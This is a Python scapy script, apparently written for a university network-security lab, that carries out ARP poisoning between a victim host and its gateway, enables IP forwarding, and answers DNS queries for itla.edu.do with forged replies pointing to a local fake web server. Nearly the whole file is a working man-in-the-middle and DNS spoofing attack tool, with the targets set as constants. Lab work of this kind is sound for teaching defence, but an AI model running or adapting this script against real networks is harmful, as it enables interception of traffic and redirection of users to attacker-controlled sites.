#!/usr/bin/env python3
"""
DNS Spoofing Attack — Sael German Garcia
Dominio objetivo: itla.edu.do
"""

import threading
import signal
import sys
from scapy.all import (
    sniff, sendp, send, get_if_hwaddr,
    ARP, Ether, IP, UDP, DNS, DNSRR, sr
)
import subprocess

IFACE   = "ens3"
TARGET  = "10.25.10.20"
GATEWAY = "10.25.10.1"
DOMAIN  = "itla.edu.do"
FAKE_IP = "10.25.10.10"

print(f"""
╔══════════════════════════════════════════╗
║   DNS SPOOFING — Sael German Garcia      ║
║   Victima  : {TARGET}            ║
║   Gateway  : {GATEWAY}             ║
║   Dominio  : {DOMAIN}          ║
║   Fake IP  : {FAKE_IP}            ║
╚══════════════════════════════════════════╝
""")

subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
print("[+] IP forwarding ON")

def get_mac(ip):
    ans, _ = sr(ARP(op=1, pdst=ip), timeout=3, verbose=False, iface=IFACE)
    for _, r in ans:
        return r[ARP].hwsrc
    return None

target_mac  = get_mac(TARGET)
gateway_mac = get_mac(GATEWAY)

if not target_mac or not gateway_mac:
    print("[!] No se pudo obtener MAC. Verifica conectividad.")
    sys.exit(1)

my_mac = get_if_hwaddr(IFACE)
print(f"[+] MAC Victima  : {target_mac}")
print(f"[+] MAC Gateway  : {gateway_mac}")
print(f"[+] MAC Atacante : {my_mac}\n")

arp_running = True

def arp_poison():
    pkt_v = ARP(op=2, pdst=TARGET,  hwdst=target_mac,
                psrc=GATEWAY, hwsrc=my_mac)
    pkt_g = ARP(op=2, pdst=GATEWAY, hwdst=gateway_mac,
                psrc=TARGET,  hwsrc=my_mac)
    print("[+] ARP Poisoning iniciado...")
    import time
    while arp_running:
        send(pkt_v, verbose=False, iface=IFACE)
        send(pkt_g, verbose=False, iface=IFACE)
        time.sleep(1.5)
    send(ARP(op=2, pdst=TARGET,  hwdst=target_mac,
             psrc=GATEWAY, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=GATEWAY, hwdst=gateway_mac,
             psrc=TARGET,  hwsrc=target_mac),  count=5, verbose=False)
    print("[*] ARP restaurado")

def start_web():
    import http.server, socketserver
    HTML = (
        b"<!DOCTYPE html>"
        b"<html><head><meta charset='utf-8'><title>ITLA</title></head>"
        b"<body style='font-family:sans-serif;text-align:center;"
        b"padding:80px;background:#0d0d1a;color:#eee'>"
        b"<h1 style='color:#e94560;font-size:3em'>!! SITIO INTERCEPTADO !!</h1>"
        b"<h2>itla.edu.do</h2>"
        b"<p style='font-size:1.2em'>DNS Spoofing exitoso</p>"
        b"<p style='color:#888'>Lab Seguridad de Redes - Sael German Garcia</p>"
        b"</body></html>"
    )
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML)
        def log_message(self, f, *a):
            print(f"[WEB] Conexion de {self.client_address[0]} -> {a[0]}")
    with socketserver.TCPServer(("0.0.0.0", 80), H) as s:
        print(f"[+] Servidor web falso corriendo en http://{FAKE_IP}")
        s.serve_forever()

count = 0

def dns_spoof(pkt):
    global count
    if not (pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt[DNS].qr == 0):
        return
    qname = pkt[DNS].qd.qname.decode().rstrip(".")
    if DOMAIN not in qname and qname not in DOMAIN:
        print(f"[~] DNS: {qname}")
        return
    count += 1
    print(f"\n[!!!] QUERY #{count} capturada: {qname}")
    print(f"      Respondiendo con -> {FAKE_IP}")
    resp = (
        Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
        UDP(sport=53, dport=pkt[UDP].sport) /
        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
            an=DNSRR(rrname=pkt[DNS].qd.qname,
                     type="A", ttl=300, rdata=FAKE_IP))
    )
    sendp(resp, iface=IFACE, verbose=False)

def cleanup(sig, frame):
    global arp_running
    print("\n[*] Deteniendo...")
    arp_running = False
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)

threading.Thread(target=arp_poison, daemon=True).start()
threading.Thread(target=start_web,  daemon=True).start()

print(f"[*] Escuchando queries DNS para '{DOMAIN}'...")
print("[*] Ctrl+C para detener\n")
sniff(
    iface=IFACE,
    filter="udp port 53",
    prn=dns_spoof,
    store=False
)
